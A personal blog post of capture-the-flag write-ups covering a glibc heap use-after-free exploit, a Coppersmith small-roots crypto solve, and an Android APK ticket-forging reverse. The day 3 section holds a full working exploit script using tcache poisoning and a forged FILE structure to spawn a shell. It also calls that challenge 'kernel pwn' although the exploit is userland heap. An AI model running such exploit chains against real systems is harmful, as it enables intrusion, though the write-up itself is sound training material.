hex-advent star labs (selected days)

recommended listening is magic i want u by jane remover.

the dear folks over at starlabs organized a 30-day long ctf by women, for women, and i participated and had a lot of fun. the challenges were released over the first 12 days of the month. here are some writeups for select challenges that i found interesting.

day 3: pwn/make a wish

Make a wish and your dreams will come true!

Guide: https://kaligulaarmblessed.github.io/challenges/hexadvent-makeawish/

Difficulty: Easy

Challenge Author: Kaligula

time taken: 9 hours

todo …

in a move i can only describe as ‘extremely fucking funny’ the 3rd ‘easy’ challenge was sourceless kernel pwn. gotta hand it to kaligula, incredible bit. i’d consider myself relatively familiar with userland pwn (i’m definitely not good by any means), but kernel pwn is a whole nother beast. i will walk through the process step by step, from setting up your system to submitting the solution.

honestly during the ctf itself i just took this decompilation and whacked it into Gemini to clean it up, but now doing my writeup (and also now that i have IDA Pro) i did the static reversing manually, just by cleaning up the variable names and setting proper types.

the crux of the challenge is in these three options:

      case 4LL:
        // free gift
        printf("Gift index: ");
        __isoc99_scanf("%d", &gift_idx);
        if ( gift_idx >= ::gift_idx )
          goto invalid_idx_B;
        gift = gift_array[gift_idx];
        if ( !gift || secondary_gift_idx_array[gift_idx] )
        {
          puts("Unable to remove gift");
        }
        else
        {
          free(gift);
          gift_array[gift_idx] = 0;
          size_array[gift_idx] = 0;
          secondary_gift_idx_array[gift_idx] = 0;
          puts("Success!");
        }
        break;
      case 5LL:
        // // add gift to freelist
        printf("Gift index: ");
        __isoc99_scanf("%d", &gift_idx);
        printf("How many gifts to give: ");
        __isoc99_scanf("%d", &v7);
        if ( gift_idx >= ::gift_idx )
          goto invalid_idx_B;
        gift = gift_array[gift_idx];
        if ( !gift )
          goto invalid_idx_A;
        secondary_gift_idx_array[gift_idx] += v7;
        if ( secondary_gift_idx_array[gift_idx] )
          secondary_gift_array[gift_idx] = gift;
        puts("Gifts given!");
        break;
      case 6LL:
        for ( i = 0; i <= 255; ++i )            // free all gifts in freelist (UAF)
        {
          if ( secondary_gift_array[i] )
          {
            printf("Gift %d sent! Merry Christmas!\n", i);
            if ( !secondary_gift_idx_array[gift_idx] )
              free(secondary_gift_array[i]);
            secondary_gift_array[i] = 0;
          }
        }
        break;

essentially, there are two places where a pointer to a gift can exist: in gift_array, and secondary_gift_array, and we are given two options to interact with those arrays. the first option correctly nulls out the pointer in gift_array and secondary_gift_array, thus leaving no dangling pointers (and no UAF). however, the second option only nulls out the pointer in secondary_gift_array, leaving a dangling pointer to a freed gift in the first array. this is our use-after-free, which is a significant enough vulnerability that we can pop a shell just from it.

however, to get started, we need heap + libc leaks. to leak the heap, we can just allocate a chunk, free it, and then directly read the ptr_mangle key from it w/ our UAF. this is because when we allocate that doesn’t have a chunk following it, the fd ptr should rightfully point to null, so the stored fd will actually be null ^ ptr_mangle (which of course would just be the ptr_mangle key). we can see this in action here.

tcachebins[idx=1, size=0x30, @0x5622387770b0]: fd=0x562238777340 count=1
 -> Chunk(base=0x562238777330, addr=0x562238777340, size=0x30, flags=PREV_INUSE, fd=0x000562238777(=0x000000000000))
[+] Found 1 valid chunks in tcache

def main():
    malloc(0x20, b'\x00') # 0
    malloc(0x20, b'\x00') # 1
    uaf_free(1)
    trigger_uaf_free()
    heap_leak = read(1)
    print(f'{clean_up(heap_leak) = }')
    p.interactive()

this code should read our leaked key:

clean_up(heap_leak) = '0000000560f445ba'

and indeed, it does. then for libc we can just do the same, but with a larger chunk that goes directly into unsorted bins.

malloc(0x1000, b'\x00') # 2
malloc(0x10, b'\x00') # 3, guard
uaf_free(2)
trigger_uaf_free()
libc_leak = clean_up(read(2))
print(f'{libc_leak = }')

afterwards, we can just tcache poison and win. to demonstrate the tcache poisoning, look below:

## tcache poisoning
malloc(0x200, b'\x00') # 4
malloc(0x200, b'\x00') # 5
uaf_free(4)
uaf_free(5)
trigger_uaf_free()
modify(5, p64(0xcacacacacacacaca ^ ptr_mangle))

we can view tcache contents, and see that the chunk’s fd ptr is correctly poisoned:

tcachebins[idx=31, size=0x210, @0x5577202441a0]: fd=0x557720244580 count=2
 -> Chunk(base=0x557720244570, addr=0x557720244580, size=0x210, flags=PREV_INUSE, fd=0xcacacacf9db8c88e(=0xcacacacacacacaca), corrupted)
 -> 0xcacacacacacacaca [corrupted chunk]

from here, we just fsop and win by writing a chunk over stderr.

solve script:

#!/usr/bin/env python3

from pwn import *

exe = ELF("./hohoheap_patched")
libc = ELF("./libc.so.6")

context.binary = exe
context.terminal = 'kitty'

p = process()
#p = remote("52.76.163.244", 5555)
gdb.attach(p)
context.log_level = 'debug'

sa = p.sendafter
sla = p.sendlineafter
ru = p.recvuntil

def malloc(size: int, content: bytes):
    sla(b":", b'1')
    sla(b":", str(size).encode())
    sa(b":", content)

def free(idx: int):
    sla(b":", b'4')
    sla(b":", str(idx).encode())

def read(idx: int):
    sla(b":", b'2')
    sla(b":", str(idx).encode())
    filter = ru(b":")
    return ru(b"\x00\x00")

def uaf_free(idx: int):
    sla(b":", b'5')
    sla(b":", str(idx).encode())
    sla(b":", str(idx).encode())

def trigger_uaf_free():
    sla(b":", b'6')

def modify(idx: int, content: bytes):
    sla(b":", b'3')
    sla(b":", str(idx).encode())
    sla(b":", content)

clean_up = lambda x: x[::-1].hex().split('0000')[-1][:-2].zfill(16)
def main():
    # begin leak nonsense
    malloc(0x400, b'\x00') # 0
    malloc(0x400, b'\x00') # 1
    free(0); free(1)
    malloc(0x400, b'\x00') # 2
    malloc(0x400, b'\x00') # 3
    leak_1 = '0x' + read(2)[::-1].hex().split('0000')[-1][:-2].zfill(16)
    leak_2 = '0x' + read(3)[::-1].hex().split('0000')[-1][:-2].zfill(16)
    ptr_mangle = (int(leak_1, 16) ^ int(leak_2, 16)) >> 12
    print('ptr_mangle leaked > ', hex(ptr_mangle))
    free(2); free(3);
    malloc(8000, b'\x00') # 4
    malloc(0x10, b'\x00') # 5 (guard chunk)
    free(4)
    malloc(8000, b'\x00') # 6
    libc.address = int('0x' + clean_up(read(6)), 16) - 0x1e7b00
    print('libc base leak > ', hex(libc.address))
    # end leak nonsense
   
    # begin UAF
    malloc(0x300, b'\x00') # 7
    malloc(0x300, b'\x00') # 8
    uaf_free(7)
    uaf_free(8)
    trigger_uaf_free()
    # tcache poison to overwrite fd ptr with address to stderr
    
    stderr_addr = libc.sym._IO_2_1_stderr_
    print(hex(stderr_addr))
    modify(8, p64(stderr_addr ^ (ptr_mangle+0x2) ))
    
    malloc(0x300, b'\x00') # 9
    input('... check bins here >')
    malloc(0x300, b'\x00') # 10

    # thank you lam junrong
    
    fs = FileStructure()
    fs.flags = u64("  " + "sh".ljust(6, "\x00"))
    fs._IO_write_base = 0
    fs._IO_write_ptr = 1
    fs._lock = stderr_addr-0x10 # Should be null
    fs.chain = libc.sym.system
    fs._codecvt = stderr_addr
    fs._wide_data = stderr_addr - 0x48
    fs.vtable = libc.sym._IO_wfile_jumps
   
    modify(10, bytes(fs))
    p.interactive()

if __name__ == "__main__":
    main()

day 11: crypto/small and simple things

I heard there is a function somewhere to find small roots...

Difficulty: Hard

Challenge Author: Ariana

time to solve: 10min

when i saw ariana was writing crypto for this i was genuinely quite scared, started worrying about whether i would need to finally properly learn lattices / p-adics but thankfully she threw a softball.

flag = int(input("Enter flag: ").encode().hex(),16)

N = ...
c = [..., ..., ..., ...]
enc = sum(i*pow(flag,n,N) for n,i in enumerate(c))%N

if enc == ...:
    print("Congrats! You got the right flag")
else:
    print("Try again")

(values have been omitted for brevity.) the challenge essentially gives you a cubic polynomial mod N and asks you to find the value that results in a certain number, so in essence:

f(x) = ax^3 + bx^2 + cx^2 + d mod N
find a such that f(a) = g

where every constant is known. we can just trivially use coppersmith’s method, implemented in sage w/ the .small_roots() method.

a few stumbling blocks is that small_roots() requires a monic polynomial, and that you’ll need to adjust the epsilon value in order to actually find the small root. but aside from that, it’s all smooth sailing. solve script:

F = Zmod(N)
R.<x> = PolynomialRing(F)
f = c[0] + c[1]*x + c[2]*x**2 + c[3]*x**3 - expected_value
y = f.monic()
flag = y.small_roots(epsilon=0.03)[0]
print(bytes.fromhex(hex(flag)[2:]))

(sage) navi@curette (/ctf-work/starlabs/day-11) > sage chal.sage
b'HEX{sagemath_is_a_wonderful_and_magical_world}'

a brief explanation of coppersmith’s method:

polynomials are generally pretty easy to solve if they’re over the integers (i.e. there’s no ugly mod complicating things). we can solve quadratics trivially using the quadratic formula, cubics w/ the cubic formula, so on and so forth. even for more complicated polynomials we have a lot of simple numeric methods to find values where f(x) = 0. it’s a solved problem!

coppersmith’s method essentially creates a polynomial w/ small coefficients out of a polynomial w large coefficients. if we define the polynomial as f(x) mod n, the goal is to make our new polynomial g with sufficiently small terms such that the mod n term is entirely irrelevant (there is no ‘wrapping around’). this converts the problem into a numerical one, which we have easy methods to solve.

the exact method by which coppersmith does this is complex (lattice reduction) but essentially it breaks the polynomial down into constituent parts, and then finds a small linear combination of those constituent parts. the key thing to consider here is that the smaller constituent polynomials also have our shared root of interest (they are constructed in such a way that ensures this root remains), so any linear combination of those constituent polynomials will also retain the same root.

essentially, we are compressing a large polynomial into a smaller polynomial using lattices.

day 12: rev/christmas lottery

Can you find Santa's winning lottery ticket?

Difficulty: Hard

Challenge Author: kestryix

time to solve: 10 minutes

i wouldn’t consider myself good at rev but it’s something i’ve been practicing a lot as of late, so i was honestly hoping for something harder! but the challenge was a lot of fun anyway :^).

the dist is an .apk file, which is a packaged android application.

christmas-lottery.apk: Android package (APK), with gradle app-metadata.properties, with APK Signing Block

aside from a lot of nonsense we can cut to the important parts of our application quite easily - as we can see, MainActivity.java has a lot of references to the flag, as well as some references to a ticket validation mechanism. let’s inspect that.

public void handleValidateResponse(B b3, JSONObject jSONObject) {
    try {
        int i3 = b3.f927d;

handleValidateResponse receives some JSON object that already has the flag in it, so this isn’t actually performing any relevant flag computation. onto another function in the same file:

public void signInAnonymouslyAndInitSeed() {
    Task<Object> taskZza;

    FirebaseAuth firebaseAuth = this.mAuth;

this signInAnonymouslyAndInitSeed function makes some references to a remote Firebase database - Firebase is a Google provided database that mobile / web developers typically use so that they don’t have to set up their own database. i personally have very little experience w/ Firebase and can’t elaborate further than that, but from here we can tell that there is some sort of interaction with a remote database.

let’s try to find more details about the database by looking at another function, requestSeedFromBackend:

public void requestSeedFromBackend(String str) {
  this.executorService.execute(new RunnableC0314k(8, this, str));
}

now it behooves us to learn more about Firebase. the idToken is not part of the app, but rather Google’s own authentication provider. when the app is launched, it will request this idToken from google given a project_id and an api_key. the api_key is clearly stored within the .apk somewhere, so where is it?

now we have this ‘seed’. this seed is used to generate some token which is then sent over to /validate, and if the token is valid, then we get the flag. but we can just generate this token ourselves, and send the request to the validate endpoint ourselves too. the token is generated here:

private String generateTicketCode() {
    StringBuilder sb = new StringBuilder();
    for (int i3 = 0; i3 < 3; i3++) {
        sb.append("ABCDEFGHJKLMNPQRSTUVWXYZ".charAt((int) ((this.secretSeed >> (i3 * 3)) % 24)));
    }
    sb.append("-");
    for (int i4 = 0; i4 < 4; i4++) {
        sb.append("0123456789".charAt((int) ((this.secretSeed >> ((i4 * 4) + 9)) % 10)));
    }
    sb.append("-");
    for (int i5 = 0; i5 < 2; i5++) {
        sb.append("ABCDEFGHJKLMNPQRSTUVWXYZ".charAt((int) ((this.secretSeed >> ((i5 * 5) + 25)) % 24)));
    }
    sb.append("0123456789".charAt(calculateChecksum(sb.toString().replace("-", "")) % 10));
    return sb.toString();
}

this is entirely deterministic and only depends on the seed. i hate java so i just whacked this into an llm and asked it to reimplement in something i can actually run (Python), which then gives the corresponding token here:

navi@curette (/ctf-work/starlabs/day-12) > python gen.py 19645546
LPB-0899-AA8
                                                                                                                                                                                             
navi@curette (/ctf-work/starlabs/day-12) > cat gen.py
ALPHABET = "ABCDEFGHJKLMNPQRSTUVWXYZ"

def calculate_checksum(s: str) -> int:
    total = 0
    for c in s:
        if c.isdigit():
            total += int(c)
        else:
            total += (ord(c) - ord('@'))
    return total % 10

def generate_ticket(seed: int) -> str:
    sb = []

    for i in range(3):
        idx = (seed >> (i * 3)) % 24
        sb.append(ALPHABET[int(idx)])
    sb.append("-")

    for i in range(4):
        idx = (seed >> ((i * 4) + 9)) % 10
        sb.append(str(int(idx)))
    sb.append("-")

    for i in range(2):
        idx = (seed >> ((i * 5) + 25)) % 24
        sb.append(ALPHABET[int(idx)])

    core = "".join(sb).replace("-", "")
    checksum = calculate_checksum(core) % 10
    sb.append(str(checksum))
    return "".join(sb)

if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument("seed", type=int, help="secretSeed as integer (long)")
    args = p.parse_args()
    print(generate_ticket(args.seed))
